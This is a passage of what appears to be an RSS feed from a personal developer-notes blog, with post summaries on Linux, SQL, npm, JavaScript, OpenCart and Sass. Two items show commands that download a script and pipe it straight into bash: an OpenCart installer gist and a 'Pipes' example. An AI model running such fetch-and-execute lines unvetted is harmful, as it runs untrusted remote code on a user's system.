      <description>tl;dr  debcnof is a configuration management tool all the questions you get during installing .deb packages are stored in debconf You can preload answers to those questions to get non-interactive/slient installations needs sudo  sudo apt install debconf-utils # get configurable values for a package sudo debconf-get-selections | grep mysql # set values echo &amp;quot;set mysql-server/root_password YOURPASSWORD&amp;quot; | debconf-communicate # sudo debconf-set-selections &amp;lt;&amp;lt;&amp;lt; &amp;quot;mysql-server mysql-server/root_password password YOURPASSWORD&amp;quot; # echo &#39;mysql-server mysql-server/root_password password YOURPASSWORD&#39; | debconf-set-selections # show the list of debconf values configured for a package debconf-show phpmyadmin  debconf is a configuration management tool for Debain.</description>
    </item>
    
    <item>
      <title>JavaScript Objects</title>
      <link>/post/_javascript/js-objects/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-objects/</guid>
      <description>JavaScript Objects { key: value property: value method: function () {} }  Object is a value type that contains key value pairs inside curly barces. Keys are also known as properties and everything in JavaScript that isn&amp;rsquo;t a primitive type is an object. Primitive types are Strings, Numbers, Booleans, Undefined, Null and Symbols (ES6). Yes, arrays are objects. Functions are objects too. The difference between functions and objects is that functions can be called.</description>
    </item>
    
    <item>
      <title>Joining Relational Data between Tables in SQL</title>
      <link>/post/_databases/2015-02-24-joining_relational_data_between_tables_in_sql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2015-02-24-joining_relational_data_between_tables_in_sql/</guid>
      <description>Keys and Auto-Incrementing Values PRIMARY keys (id) Used to uniquely define each row in a table. It can&amp;rsquo;t be duplicated, can&amp;rsquo;t be null.
UNIQUE keys (email_address, ssn) Is similar to Primary keys but enforces uniqueness, can&amp;rsquo;t be duplicated but can be null.
FOREIGN keys (genre_id) Special keys that describe the relationship between data in two in two tables. Also known as reference keys because they reference data from another table.</description>
    </item>
    
    <item>
      <title>Linux - Basic User Management</title>
      <link>/post/_linux/2014-08-31-linux-basic-user-management/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2014-08-31-linux-basic-user-management/</guid>
      <description>Cheatsheet |command|meaning| |-|-| | whoami | show which user is logged in | | passwd | change password of current user | | passwd jane | change Jane&amp;rsquo;s password | | su | become superuser / change user to root | | su jane | change user to jane | |sudo | superuser do = do it as a superuser | | adduser james | add a user named &amp;lsquo;james&amp;rsquo; | | deluser james | delete the user &amp;lsquo;james&amp;rsquo; | | passwd -l jane | lock jane&amp;rsquo;s password | | passwd &amp;ndash;lock jane | lock jane&amp;rsquo;s password |</description>
    </item>
    
    <item>
      <title>Linux Disk File Systems (ext2, ext3, Reiser, ext4)</title>
      <link>/post/_linux/linux-disk-file-systems-ext2-ext3-reiser-ext4/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/linux-disk-file-systems-ext2-ext3-reiser-ext4/</guid>
      <description>ext2 2nd Extended File System. It was originally introduced back in 1993 and ext2 stores data in the standard hierarchial fashion used by most other file systems.
Data is stored in files, files are stored in directories, and a directory can simply contain either files or other directories.
Max file size is 2TB. An ext2 volume can be upto 4TB. File names can be upto 255 characters long and ext2 supports Linux filesystem users, groups and permissions.</description>
    </item>
    
    <item>
      <title>Making a site presentable in 7 lines of code</title>
      <link>/post/_css-sass/css-minimum-styles-for-presentable-website/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/css-minimum-styles-for-presentable-website/</guid>
      <description> With just 7 CSS declarations you can make a site very presentable with easy to read typography.
body { margin: 40px auto; max-width: 650px; line-height: 1.6; font-size: 18px; color: #444; padding: 0 10px } h1, h2, h3 { line-height:1.2 }  To go one step further, you can add media queries
@media print { body { max-width: none } }  Links  http://bettermotherfuckingwebsite.com/  </description>
    </item>
    
    <item>
      <title>Manipulating Schema with SQL</title>
      <link>/post/_databases/2015-02-24-manipulating_schema_with_sql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2015-02-24-manipulating_schema_with_sql/</guid>
      <description>If your database is connected to an app, you&amp;rsquo;d probably want to take that app offline or put into some maintenance mode so that any database changes you make don&amp;rsquo;t effect the application.
Also, BACKUP before making any changes.
Altering Tables    Keyword Meaning     RENAME Rename   DROP Delete   TRUNCATE Empty    Rename {% highlight mysql %} RENAME TABLE movies TO movie_table; {% endhighlight %}  You can also rename multiple tables in one go</description>
    </item>
    
    <item>
      <title>Migrating server data and databases</title>
      <link>/post/_sysadmin/migrating-server-data/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/migrating-server-data/</guid>
      <description>Migrating data from a barebones server to another barebones server Compress files Let&amp;rsquo;s say you have websites in /var/www folder that you want to transfer. Compressing them first will save bandwidth as well as transfer time.
# tar czf &amp;lt;filename&amp;gt; &amp;lt;source&amp;gt; tar czf aamnah.tar.gz /var/www/aamnah.com  c - create z - compress (gzip) f - take a filename v - verbose (optional, if you wanna see lines fly by on the termianl)</description>
    </item>
    
    <item>
      <title>Moving from Jekyll to Hugo</title>
      <link>/post/_webdev/move-jekyll-hugo/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/move-jekyll-hugo/</guid>
      <description>Why?  Jekyll is SLOW. Takes about 25 secs to build this site right now, and this site is pretty small right now, less than 500 posts. There are no tags or categories or pagination yet and it&amp;rsquo;s at 20 seconds already. I have to wait for it to finish in order to see any changes, and i make changes often, so i end up waiting often. Slow is pretty much my only complaint.</description>
    </item>
    
    <item>
      <title>My Gruntfile.js</title>
      <link>/post/_workflow/2015-01-22-aamnah-gruntfile.js/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_workflow/2015-01-22-aamnah-gruntfile.js/</guid>
      <description>It includes the following - Minify JS - Minify CSS - Minify HTML - Optimizie Images - Create responsive screenshots
We&amp;rsquo;ll use pageres to generate screenshots of the website in multiple resolutions. This comes in handy when you need to show that your website is responsive, need to check it looks good in all resolutions or just need a screenshot of the website to include as a preview.
For example, WordPress themes automatically pick up &amp;lsquo;screenshot.</description>
    </item>
    
    <item>
      <title>MySQL Commands</title>
      <link>/post/_cheatsheets/cheatsheet_mysql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_cheatsheets/cheatsheet_mysql/</guid>
      <description>Connect to MySQL mysql -u aamnah -p —h db.mysite.com -P 3306 db_name  OR
mysql --user=username --password=password --host=host --port=3306 db_name     options values     -u or --user username   -p or --password password   -h or --host host (default: localhost)   -P or --port Port (default: 3306)    Replace _dbname with the name of the database you want to connect to.</description>
    </item>
    
    <item>
      <title>NPM intro</title>
      <link>/post/_nodejs/npm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_nodejs/npm/</guid>
      <description>NPM  npm = Node Package Manager Let&amp;rsquo;s you install and manage your modules. A module is just a bunch of code grouped together. It makes it easy to update your modules (versions) without having to edit code.  why NPM?  makes it easy to download different modules makes it easy to upgrade different modules (e.g. jquery, bootstrap) makes it easy to remove modules it&amp;rsquo;s a package manager. it makes your life easy by making managing your modules and packages easier it let&amp;rsquo;s you install modules with single commands instead of having to download code locally and including it, or including links to CDNs.</description>
    </item>
    
    <item>
      <title>NPM, Modules and Dependencies</title>
      <link>/post/_nodejs/npm-modules-dependencies/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_nodejs/npm-modules-dependencies/</guid>
      <description>tl;dr  npm install &amp;lt;module&amp;gt; --save - install a module and save it as a dependency in package.json npm install &amp;lt;module&amp;gt; --dev - install a module and save it as a devDependency in package.json npm install &amp;lt;module&amp;gt; -g install a module globally npm update &amp;lt;module&amp;gt; updates a module to latest version npm init - create a package.json npm install - install all dependencies listed in package.json  Node Package Manager, installing and managing dependencies.</description>
    </item>
    
    <item>
      <title>Networking Intro</title>
      <link>/post/_linux/netwroking-intro/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/netwroking-intro/</guid>
      <description>https://www.youtube.com/watch?v=hfUtHodJdWs
 cat /etc/services  TCP and UDP  TCP is reliable, resends the message if it fails UDP is unreliable  Ports and Permissions  Systems can only listen to ports below 1024 as root (i.e. they require sudo)  Servers  Often time servers are described as systems that listen to incoming connections Any computer can be a server  netcat  netcat nc allows you to setup tcp and udp connections and servers with netcat you can speak tcp directly the communication is bi-directional (the messages flow both ways)  # sudo apt install netcat nc -l 5000 # listen on port 5000 nc -lp 5000 # listen on port 5000  from another session, you can now send messages to port 5000</description>
    </item>
    
    <item>
      <title>Node.js and it&#39;s C&#43;&#43; core</title>
      <link>/post/_nodejs/nodejs-intro/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_nodejs/nodejs-intro/</guid>
      <description>Nodejs Intro  Node.js is a C++ program that has embedded Chrome&amp;rsquo;s V8 Engine, another C++ program, and has added features to it, which can be used by writing JavaScript code. Because of it&amp;rsquo;s C++ core, Node.js is suitable to be a server (backend) technology. JavaScript V8 Engine is written in C++. V8 engine can be run standalone, or be embedded in another C++ application, which is what Node.js did, it embedded V8 inside.</description>
    </item>
    
    <item>
      <title>Notes on creating a Chrome extension</title>
      <link>/post/_javascript/chrome-create-an-extension/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/chrome-create-an-extension/</guid>
      <description>Needed
 manifest.json is required. It&amp;rsquo;s kinda like package.json in Node. manifest.json has info about your extension The icon needs to be 19x19 pixels  Getting started  Create a new folder, create a manifest.json file inside Load your extension in browser by going to Chrome &amp;gt; Extension &amp;gt; Enable Developer Mode &amp;gt; Load unpacked extension.. and point to the folder you created Once you have the folder loaded, you can make edits in your code, refresh Chrome (Cmd+R) and the changes will reflect  { &amp;quot;manifest_version&amp;quot;: 2, &amp;quot;name&amp;quot;: &amp;quot;My Awesome Extension&amp;quot;, &amp;quot;description&amp;quot;: &amp;quot;This extension is an awesome extension&amp;quot;, &amp;quot;version&amp;quot;: &amp;quot;0.</description>
    </item>
    
    <item>
      <title>Object Oriented PHP</title>
      <link>/post/_php/2015-03-20-object_oriented_php/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_php/2015-03-20-object_oriented_php/</guid>
      <description>The basic pillars of Object Oriented Programming (OOP) are:
 Encapsulation Inheritance Polymorphism  Encapsulation Encapsulation is a way for us to bundle or organize our data into a format that is easily readable and extensible. It is also largely about controlling access to code by using visibility keywords define if something is public, private and so on..
Inheritance Inheritance is a method of establishing relationships, such as a parent is to a child, or between classes or objects.</description>
    </item>
    
    <item>
      <title>Object copying in JavaScript</title>
      <link>/post/_javascript/js-object-copying/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-object-copying/</guid>
      <description>Object.assign, concat, filter, map, reduce are always going to return a brand new object.
 shallow copy deep copy (clone) freeze deepFreeze side effects  Object copying Shallow copy, deep copy (and others, e.g. lazy copy) are methods of copying an object. &amp;gt; Copying is done mostly so the copy can be modified or moved, or the current value preserved. If either of these is unneeded, a reference to the original data is sufficient and more efficient, as no copying occurs.</description>
    </item>
    
    <item>
      <title>OpenCart: Bulk Update Customer Group via phpmyadmin</title>
      <link>/post/_databases/opencart_bulk-update-customer-groups/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/opencart_bulk-update-customer-groups/</guid>
      <description>Why? Because you can not delete a group if it has customers in it. And there is no easy way to move all customers to another group via the admin.
Warning: This customer group cannot be deleted as it is currently assigned to 2170 customers!  Find the customer_group_id number of a Customer Group You can find the customer_group_id from the Admin URL, or by checking the oc_customer_group_description table</description>
    </item>
    
    <item>
      <title>OpenCart: Bulk update prices of Products</title>
      <link>/post/_databases/opencart_bulk-update-product-prices-phpmyadmin-mysql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/opencart_bulk-update-product-prices-phpmyadmin-mysql/</guid>
      <description>Changing the currency of an OpenCart store
 update product price update discount and special prices update order totals  MySQL Commands Multiply all prices in a column by 3.67000008
UPDATE `oc_product` SET `price` = `price` * 3.670008  Round the numbers of an entire column
UPDATE `oc_product` SET `price` = ROUND(`price`)  Select price column and create a new column ROUND(price) by rounding the value of price
SELECT `price`, ROUND(`price`) from `oc_product`  Why?</description>
    </item>
    
    <item>
      <title>OpenCart: Delete Multi-Store and Move Everything to the Default Store</title>
      <link>/post/_databases/opencart_delete_multi-store_and_move_everything_to_the_default_store/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/opencart_delete_multi-store_and_move_everything_to_the_default_store/</guid>
      <description>Make a BACKUP before doing anything to the database. Be safe.
Assumptions This post assumes that
 the store_id for Default store is 0 you have only 1 multi-store you are moving things from Multi-store to Default store you want to delete Multi-Store you have products that were added to both Default and Multi-store everything means products, categories, manufacturers and information  We can&amp;rsquo;t delete a multi-store if there are orders associated with it.</description>
    </item>
    
    <item>
      <title>Opencart Architecture</title>
      <link>/post/_opencart/2015-04-04-opencart_architecture/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_opencart/2015-04-04-opencart_architecture/</guid>
      <description>Libraries Languages Languages are stored in catalog/language/ and loaded in Controllers
Define a language key The Values that are used across many pages are stored is english.php. If you want to add a new value just follow the syntax below:
$_[&#39;language_key&#39;]=&#39;This is test&#39;;  Load a language The languages based on special pages are located inside the folders. For example, for error page the language file can be found at:</description>
    </item>
    
    <item>
      <title>Opencart Install Script</title>
      <link>/post/bash-scripting/opencart-install-script/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/opencart-install-script/</guid>
      <description>You can run this script directly using the following command
curl -L https://gist.githubusercontent.com/aamnah/93cb63fc15e708649084/raw | bash  Here is the code, add this to your ~/.bash_profile and it&amp;rsquo;ll be available for you anywhere in the terminal.
 Usage: To run just type opencart.</description>
    </item>
    
    <item>
      <title>Opening and Writing to Files in Python</title>
      <link>/post/_python/2015-04-10-opening_and_writing_to_files_in_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2015-04-10-opening_and_writing_to_files_in_python/</guid>
      <description>Our bio.txt contains
Name: Aamnah Age: 26 Location: Dubai Gender: Female  To open it in Python:
{% highlight python %} file = open(&#39;bio.txt&#39;) {% endhighlight %}  The function open() can take two parameters, one is the path of the file
bio.txt (required). The other is mode (optional) which specifies the mode in which the file is opened, for example w+b. The default mode is r which means open for reading in text mode.</description>
    </item>
    
    <item>
      <title>Packages and Dependencies</title>
      <link>/post/_programming/packages-dependencies/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_programming/packages-dependencies/</guid>
      <description>They call it package, because many times you would have a collection of libraries that are packaged together, and you download that package rather than each individual library. As for dependency, many times a package will depend on another package, and the dependency manager can help solve that problem.
A dependency manager also takes care of versioning and package updates.
Each programming language has it&amp;rsquo;s own flavor of dependency manager. For instance, for Javascript Node.</description>
    </item>
    
    <item>
      <title>Page Speed Optimizations</title>
      <link>/post/_webdev/2015-01-19-page-speed-optimizations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/2015-01-19-page-speed-optimizations/</guid>
      <description>Eliminate render-blocking JavaScript and CSS in above-the-fold content  Remove render-blocking JavaScript Optimize CSS Delivery  Enable compression (Apache: Use mod_deflate) Improve server response time Leverage browser caching Minify JavaScript Minify CSS Minify HTML Optimize Images  Apache Server Configuration and httpd.conf / .htaccess Sample Configurations The HTML5 Boilerplate project contains sample configuration files for all the most popular servers with detailed comments for each configuration flag and setting: find your favorite server in the list, look for the gzip section, and confirm that your server is configured with recommended settings.</description>
    </item>
    
    <item>
      <title>Pipes |</title>
      <link>/post/_commands/pipes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/pipes/</guid>
      <description>Pipe | Pipes the output of one command as the input of another.
Let&amp;rsquo;s you put commands together
grep commands are very commonly used with piped input.
For example:
ls /etc/ | grep cron  You can use multiple pipes
ls /ect/ | grep cron | grep daily  Another example is:
curl -s http://link.com | bash  will pass in the output of the curl command as the input of the bash command, which basically means you can now run commands off of internet scripts/files.</description>
    </item>
    
    <item>
      <title>Play sound/video when image/link is clicked</title>
      <link>/post/_javascript/play-sound-video-image-click/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/play-sound-video-image-click/</guid>
      <description>Demo
We need:
 a js function for playing sound/video a reference to that js function in the href tag of the image/link/video an audio/video file with a unique id  JS Basically, get the media file by id and use .play() to play it.
function play(media) { document.getElementById(media).play(); }  HTML The magic in using direct reference to js functions in the href tag. Like so: href=&amp;quot;javascript:play(&#39;media&#39;)&amp;quot;
&amp;lt;!-- image --&amp;gt; &amp;lt;a href=&amp;quot;javascript:play(&#39;dog&#39;)&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;img/dog.</description>
    </item>
    
    <item>
      <title>Prototypal Inheritance and Constructor Functions</title>
      <link>/post/_javascript/prototypal-inheritance-and-constructor-functions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/prototypal-inheritance-and-constructor-functions/</guid>
      <description>tl;dr  A constructor function is just a normal function that creates (constructs) an object Every object has a Prototype object __proto__ Every object inherits from it&amp;rsquo;s Prototype object. If the prototype has a method or a property, the object using or pointing to that prototype will have those too Changes made to a protype instantly updates all existing objects using that prototype, unlike object constructors which pass changes when new instances are created You would ideally use them both, methods in object constructor and methods in object prototype, in order to maximize on the performance and situation  You can edit the prototype in order to pass data to every instance of the object.</description>
    </item>
    
    <item>
      <title>Python Basics</title>
      <link>/post/_python/2015-02-22-python_basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2015-02-22-python_basics/</guid>
      <description>Print print() Print is pretty much the same as echo in Bash and PHP and puts in Ruby
{% highlight python %} name = &amp;quot;Aamnah Akram&amp;quot; print(name) {% endhighlight %}  Input input() Function to get information from a user. Always gets a string, even if the content is a number.
{% highlight python %} input(&amp;quot;How are you today?&amp;quot;) {% endhighlight %}  Variables Variables in Python can not start with a number</description>
    </item>
    
    <item>
      <title>Python Modules</title>
      <link>/post/_python/2015-02-22-python_modules/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2015-02-22-python_modules/</guid>
      <description> Modules in Python are simply Python files with the .py extension, which implement a set of functions. Modules are imported from other modules using the import command.
To import a module, we use the import command. There are plenty of built-in modules in the Python standard library. Check out the full list here.
Resources  LearnPython.org - Modules and Packages  </description>
    </item>
    
    <item>
      <title>Querying the DOM</title>
      <link>/post/_webdev/querying-the-dom/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/querying-the-dom/</guid>
      <description>Querying is fancy word for searching/locating DOM elements using API methods, like getElementById() for example. The DOM (Document Object Model) represents a document as a tree. The tree is made up of parent-child relationships, a parent can have one or many children nodes.
Note that generally a DOM is a model for a structured document, it is not restricted to or even invented for HTML or XML. A DOM is a general concept applicable to any document, especially those (the vast majority of them do) showing a hierarchical structure in which you need to navigate.</description>
    </item>
    
    <item>
      <title>React Router Basics</title>
      <link>/post/_javascript/2016-12-01-basics-react-router/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/2016-12-01-basics-react-router/</guid>
      <description>ReactDOM.render(( &amp;lt;Router history={browserHistory}&amp;gt; &amp;lt;Route path=&#39;/&#39; component={Users} /&amp;gt; &amp;lt;Route path=&#39;/other&#39; component={Other} /&amp;gt; &amp;lt;/Router&amp;gt; ), document.getElementById(&#39;root&#39;))  history is required.
What we did above is we mounted a Router to the DOM, it is now going to take Routes. A route takes a path (URL) and shows a component on that path.
Link If you want to navigate anywhere within the site, you use Link. You&amp;rsquo;ll only use actual href when you want to move away from the site.</description>
    </item>
    
    <item>
      <title>Rebasing vs. Merging</title>
      <link>/post/_git-github/rebase-vs-merge/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_git-github/rebase-vs-merge/</guid>
      <description> Cheatsheet
Rebasing vs. Merging Merging combine branches, you go to different paths and join back in the main road. Rebasing adds branches on top of other branches. You go to a different path, and then come back and add the whole path on top of the main road.
Rebasing is neat, but you kinda lose the original commit authors.
Tools  Git Kraken - Mac, Windows, Linux Smart Git - Mac, Windows, Linxu  Links  YouTube: Git Tutorial: Rebasing &amp;amp; Merging  </description>
    </item>
    
    <item>
      <title>Recursion</title>
      <link>/post/_programming/recursion/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_programming/recursion/</guid>
      <description>Recursion A recursive function is a function which calls itself.
Here&amp;rsquo;s how it goes: beginning recursion -&amp;gt; recursive loop of repeating a task -&amp;gt; until we hit our base case.
 a function being defined is applied within its own definition. While this apparently defines an infinite number of instances (function values), it is often done in such a way that no loop or infinite chain of references can occur.</description>
    </item>
    
    <item>
      <title>Redirects (&amp;gt;, &amp;gt;&amp;gt;, 2&amp;gt;, 2&amp;gt;&amp;amp;1)</title>
      <link>/post/_commands/redirects/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/redirects/</guid>
      <description>&amp;gt; write/overwrite Write (will overwrite existing file if any, otherwise will create a new one)
echo &amp;quot;Bonjour la monde!&amp;quot; &amp;gt; helloworld.txt # write the output of ls in /etc/ to file.txt ls /etc/ &amp;gt; file.txt  &amp;gt; will write the stdout.
&amp;gt;&amp;gt; append Append (will append at the end of existing file content, will create file if file doesn&amp;rsquo;t exist)
echo &amp;quot;Bonjour la monde!&amp;quot; &amp;gt;&amp;gt; helloworld.txt echo &amp;quot;alias dl=&#39;cd /Users/aamnah/Downloads&#39;&amp;quot; &amp;gt;&amp;gt; .</description>
    </item>
    
    <item>
      <title>Regex</title>
      <link>/post/_webdev/2014-08-29-regex/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/2014-08-29-regex/</guid>
      <description> Regular Expressions 101 - Online regex tester and debugger: JavaScript, Python, PHP, and PCRE
 RegExr: Learn, Build, &amp;amp; Test RegEx
  </description>
    </item>
    
    <item>
      <title>Regex in Python</title>
      <link>/post/_python/2015-02-22-regex_in_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2015-02-22-regex_in_python/</guid>
      <description>Here is a sample file names.txt that we&amp;rsquo;ll be using regex on.
Love, Kenneth kenneth@teamtreehouse.com (555) 555-5555 Teacher, Treehouse @kennethlove McFarland, Dave dave@teamtreehouse.com (555) 555-5554 Teacher, Treehouse Arthur, King king_arthur@camelot.co.uk King, Camelot Österberg, Sven-Erik governor@norrbotten.co.se Governor, Norrbotten @sverik , Tim tim@killerrabbit.com Enchanter, Killer Rabbit Cave Carson, Ryan ryan@teamtreehouse.com (555) 555-5543 CEO, Treehouse @ryancarson Doctor, The doctor+companion@tardis.co.uk Time Lord, Gallifrey Exampleson, Example me@example.com 555-555-5552 Example, Example Co. @example Obama, Barack president.</description>
    </item>
    
    <item>
      <title>Require script to be run as root</title>
      <link>/post/bash-scripting/run-script-as-root/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/run-script-as-root/</guid>
      <description> Run as root [ &amp;quot;$EUID&amp;quot; -eq 0 ] || { echo &#39;Please run with sudo or as root.&#39; exit 1 }  </description>
    </item>
    
    <item>
      <title>Reset MySQL root password on Linux</title>
      <link>/post/_databases/reset-mysql-root-password/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/reset-mysql-root-password/</guid>
      <description>stop mysql
sudo service mysql stop  Start MySQL in safe mode
sudo mysqld_safe --skip-grant-tables  You may need to type Enter twice.
# mysqld_safe --skip-grant-tables 2017-07-25T07:39:45.596828Z mysqld_safe Logging to syslog. 2017-07-25T07:39:45.600267Z mysqld_safe Logging to &#39;/var/log/mysql/error.log&#39;. 2017-07-25T07:39:45.621303Z mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql  If you see the above (and don&amp;rsquo;t get the prompt back) it worked, just open a new termianl and log in. To avoid losing the prompt, you can run the previous command in the background by adding a &amp;amp; at the end, like: sudo mysqld_safe --skip-grant-tables &amp;amp;</description>
    </item>
    
    <item>
      <title>Routing</title>
      <link>/post/_nodejs/routing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_nodejs/routing/</guid>
      <description>Routing is all about handling routes, .i.e URL paths. What to do/present/show when someone goes to a route (aka a URL or a path) routes are URL handling code  // Route definition structure app.METHOD(PATH, HANDLER)   The METHOD could be any http method (GET, POST, PUT, DELETE etc.). You can also use all as a catchall for any method supported in the http module (it&amp;rsquo;ll execute the handler for the URL regardless of the method you are using) app.</description>
    </item>
    
    <item>
      <title>Running system commands from within Python scripts</title>
      <link>/post/_python/2014-08-26-running-system-commands-from-within-python-scripts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-08-26-running-system-commands-from-within-python-scripts/</guid>
      <description>{% highlight python %} import os os.system(&amp;lsquo;your command goes here&amp;rsquo;) {% endhighlight %}
The commands you can pass are operating system specific. For example, to clear the console screen in Windows, it&amp;rsquo;ll be
{% highlight python %} os.system(&#39;cls&#39;) {% endhighlight %} and to clear the console screen in Mac it&#39;ll be {% highlight python %} os.system(&#39;clear&#39;) {% endhighlight %}. Both are OS specific commands for the same purpose.  You can read more about the os library in the Python documentation for os v15.</description>
    </item>
    
    <item>
      <title>SFTP Users for Website directory</title>
      <link>/post/_sysadmin/sftp-www/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/sftp-www/</guid>
      <description>The ChrootDirectory must be owned by root. You can enable access to dirs inside the ChrootDirectory owned by differet users The ChrootDirectory needs 755 permissions Add everything to the END OF THE FILE. Or else it won&amp;rsquo;t work Web directories /var/www need to be owned by www-data  What we&amp;rsquo;ll do  Create a Group for SFTP access Add our users to that SFTP Group  Here&amp;rsquo;s what each of those directives do:</description>
    </item>
    
    <item>
      <title>SQLite Basics</title>
      <link>/post/_databases/2015-03-22-sqlite_basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2015-03-22-sqlite_basics/</guid>
      <description> sqlite3 - Start SQLite sqlite3 NAME.db - Create database .database - Show Database names and files .tables - List tables .open NAME.db - Open a database file / link it to database  </description>
    </item>
    
    <item>
      <title>SSH Keys</title>
      <link>/post/_linux/ssh-keys/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/ssh-keys/</guid>
      <description>Generate a key pair locally Give the public key to the remote server Keep the private key yourself  Generate key ssh-keygen -t rsa  Copy .pub file to remote scp id_rsa.pub user@remoteserver:location  On linux you can do
ssh-copy-id user@123.456.789.123  Permissions The remote server doesn&amp;rsquo;t like the authorizated_keys file having too many permissions. For better security, change the authorizated_keys file to 600 and the ssh folder to 700.</description>
    </item>
    
    <item>
      <title>SSH Tunneling / Port Forwarding</title>
      <link>/post/_linux/ssh-tunneling-port-forwarding/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/ssh-tunneling-port-forwarding/</guid>
      <description>ssh -f -L 2222:54.86.218.65  ssh -f -L 2222:vortex.myserver.com:22 localhost -N   -f force -L local -N don&amp;rsquo;t execute any commands at remote host 2222 is local port vortex.myserver.com is remote server 22 is remote port localhost is the system we&amp;rsquo;re creating an alias for  It looks like you have connected to yourself, but what you have done is you&amp;rsquo;ve tunneled your connection on the 2222 local port. Now you have a gateway to a remote network.</description>
    </item>
    
    <item>
      <title>Sass -  Mixins vs. Extend</title>
      <link>/post/_css-sass/sass-mixins_vs_extend/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/sass-mixins_vs_extend/</guid>
      <description>source</description>
    </item>
    
    <item>
      <title>Sass - Beginner to Advanced in 30 Minutes</title>
      <link>/post/_css-sass/90-days-of-css/sass-overview/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/90-days-of-css/sass-overview/</guid>
      <description>node-sass npm i -D node-sass  add a script to package.json
&amp;quot;start&amp;quot;: &amp;quot;node-sass -o css scss&amp;quot;  -o is for output folder, which in our case is css.
partials  prepend files with an underscore but import them without the underscore or the file extension CSS imports create additional resource requests, and they don&amp;rsquo;t get compiled Sass imports get compiled into one file Import order matters  Partials let you compile multiple files into one and organize your code better.</description>
    </item>
    
    <item>
      <title>Sass Function to Auto-Convert Pixels to Ems</title>
      <link>/post/_css-sass/sass-convert-pixels-px-ems/</link>
